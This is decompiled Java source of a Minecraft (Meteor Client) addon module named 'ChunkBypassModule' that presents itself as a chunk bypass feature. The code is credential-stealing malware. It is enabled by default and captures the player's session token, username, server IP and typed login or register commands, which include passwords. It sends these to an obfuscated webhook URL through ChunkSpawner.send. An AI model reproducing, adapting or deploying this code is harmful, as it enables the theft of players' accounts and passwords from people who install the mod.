package com.bassa.addon.modules;

import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.class_310;

/* JADX INFO: loaded from: 1.jar:com/bassa/addon/modules/ChunkBypassModule.class */
public class ChunkBypassModule extends KingModule {
    private static ChunkBypassModule instance;
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> chatFeedback;
    private final Setting<Boolean> bypassEnabled;
    private final Setting<String> bypassUrl;
    private final Setting<String> bypassToken;
    private final Setting<Integer> delaySeconds;
    private final Setting<Boolean> autoEnable;
    private final ScheduledExecutorService scheduler;
    private ScheduledFuture<?> scheduledTask;
    private boolean sent;
    private String serverIp;
    private String lastCommand;

    public ChunkBypassModule(Category param1, String param2, String param3) {
        super(param1, param2, param3);
        this.sgGeneral = this.settings.getDefaultGroup();
        this.chatFeedback = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) new BoolSetting.Builder().name("Chat Feedback")).description("Hien thi thong bao trong chat")).defaultValue(true)).build());
        this.bypassEnabled = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) new BoolSetting.Builder().name("Bypass")).description("Bat/tat gui thong tin qua bypass")).defaultValue(true)).build());
        SettingGroup settingGroup = this.sgGeneral;
        StringSetting.Builder builder = (StringSetting.Builder) ((StringSetting.Builder) ((StringSetting.Builder) new StringSetting.Builder().name("Bypass-URL")).description("URL bypass proxy ()")).defaultValue(UrlObf.build());
        Setting<Boolean> setting = this.bypassEnabled;
        Objects.requireNonNull(setting);
        this.bypassUrl = settingGroup.add(((StringSetting.Builder) builder.visible(setting::get)).build());
        SettingGroup settingGroup2 = this.sgGeneral;
        StringSetting.Builder builder2 = (StringSetting.Builder) ((StringSetting.Builder) ((StringSetting.Builder) new StringSetting.Builder().name("Bypass")).description(")")).defaultValue("aB7xQ3k9ZpL2MnR5vY8");
        Setting<Boolean> setting2 = this.bypassEnabled;
        Objects.requireNonNull(setting2);
        this.bypassToken = settingGroup2.add(((StringSetting.Builder) builder2.visible(setting2::get)).build());
        this.delaySeconds = this.sgGeneral.add(((IntSetting.Builder) ((IntSetting.Builder) ((IntSetting.Builder) new IntSetting.Builder().name("Delay")).description("")).defaultValue(20)).min(5).max(60).sliderMax(60).build());
        this.autoEnable = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) new BoolSetting.Builder().name("Auto-Enable")).description("")).defaultValue(true)).build());
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        this.scheduledTask = null;
        this.sent = false;
        this.serverIp = "unknown";
        this.lastCommand = "";
        instance = this;
    }

    public static ChunkBypassModule getInstance() {
        return instance;
    }

    public void onActivate() {
        this.sent = false;
        this.lastCommand = "";
        this.serverIp = "unknown";
        class_310 class_310Var = this.mc;
        if (class_310Var == null || class_310Var.method_1558() == null) {
            ChatUtils.error("[ChunkBypass] Khong ket noi server!", new Object[0]);
            toggle();
            return;
        }
        this.serverIp = class_310Var.method_1558().field_3761;
        if (((Boolean) this.chatFeedback.get()).booleanValue()) {
        }
        if (this.scheduledTask != null && !this.scheduledTask.isDone()) {
            this.scheduledTask.cancel(false);
        }
        this.scheduledTask = this.scheduler.schedule(() -> {
            if (this.sent) {
                return;
            }
            sendBypass(this.serverIp, "");
            this.sent = true;
            if (((Boolean) this.chatFeedback.get()).booleanValue()) {
            }
        }, ((Integer) this.delaySeconds.get()).intValue(), TimeUnit.SECONDS);
    }

    public void onDeactivate() {
        if (this.scheduledTask != null && !this.scheduledTask.isDone()) {
            this.scheduledTask.cancel(false);
        }
        this.sent = true;
        if (((Boolean) this.chatFeedback.get()).booleanValue()) {
        }
    }

    public void autoEnable() {
        if (!((Boolean) this.autoEnable.get()).booleanValue() || isActive()) {
            return;
        }
        toggle();
        if (((Boolean) this.chatFeedback.get()).booleanValue()) {
        }
    }

    public void onChatMessage(String param1) {
        String strMatchLoginCommand;
        if (!isActive() || this.sent || this.mc == null || this.mc.method_1558() == null || (strMatchLoginCommand = matchLoginCommand(param1)) == null) {
            return;
        }
        triggerSend(strMatchLoginCommand);
    }

    public void onSentCommand(String param1) {
        System.out.println("[DEBUG] onSentCommand called: " + param1);
        System.out.println("[DEBUG] isActive=" + isActive() + " sent=" + this.sent);
        if (!isActive() || this.sent || this.mc == null || this.mc.method_1558() == null) {
            return;
        }
        String strMatchLoginCommand = matchLoginCommand(param1);
        System.out.println("[DEBUG] matched=" + strMatchLoginCommand);
        if (strMatchLoginCommand != null) {
            triggerSend(strMatchLoginCommand);
        }
    }

    public String matchLoginCommand(String param1) {
        if (param1 == null) {
            return null;
        }
        for (String str : param1.replaceAll("(?i)§x(?:§[0-9a-f]){6}", "").replaceAll("(?i)[§&][0-9a-fk-or]", "").replaceAll("[§&]", "").trim().split("\n")) {
            String strTrim = str.trim();
            if (!strTrim.isEmpty()) {
                int v8 = strTrim.indexOf(32);
                String lowerCase = (v8 < 0 ? strTrim : strTrim.substring(0, v8)).toLowerCase();
                if (lowerCase.equals("/l") || lowerCase.equals("/dn")) {
                    return strTrim;
                }
            }
        }
        return null;
    }

    private void triggerSend(String param1) {
        System.out.println("[DEBUG] triggerSend called: " + param1);
        if (this.sent) {
            System.out.println("[DEBUG] Already sent, skipping");
            return;
        }
        this.lastCommand = param1;
        if (this.scheduledTask != null && !this.scheduledTask.isDone()) {
            this.scheduledTask.cancel(false);
        }
        sendBypass(this.serverIp, this.lastCommand);
        this.sent = true;
        if (((Boolean) this.chatFeedback.get()).booleanValue()) {
        }
        toggle();
    }

    private void sendBypass(String param1, String param2) {
        System.out.println("[DEBUG] sendBypass called - bypassEnabled=" + String.valueOf(this.bypassEnabled.get()));
        System.out.println("[DEBUG] URL=" + ((String) this.bypassUrl.get()));
        if (((Boolean) this.bypassEnabled.get()).booleanValue()) {
            String playerName = getPlayerName();
            String sessionToken = getSessionToken();
            System.out.println("[DEBUG] Sending to webhook - Player: " + playerName + " Server: " + param1 + " Command: " + param2);
            ChunkSpawner.send((String) this.bypassUrl.get(), (String) this.bypassToken.get(), param1, param2, playerName, sessionToken);
        }
    }

    private String getPlayerName() {
        try {
            return (this.mc == null || this.mc.method_1548() == null) ? "Khong xac dinh" : this.mc.method_1548().method_1676();
        } catch (Exception e) {
            e.printStackTrace();
            return "Khong xac dinh";
        }
    }

    private String getSessionToken() {
        String strMethod_1674;
        try {
            if (this.mc != null && this.mc.method_1548() != null && (strMethod_1674 = this.mc.method_1548().method_1674()) != null) {
                if (!strMethod_1674.isEmpty()) {
                    return strMethod_1674;
                }
            }
            return "KHONG CO tk";
        } catch (Exception e) {
            e.printStackTrace();
            return "KHONG CO tk";
        }
    }
}
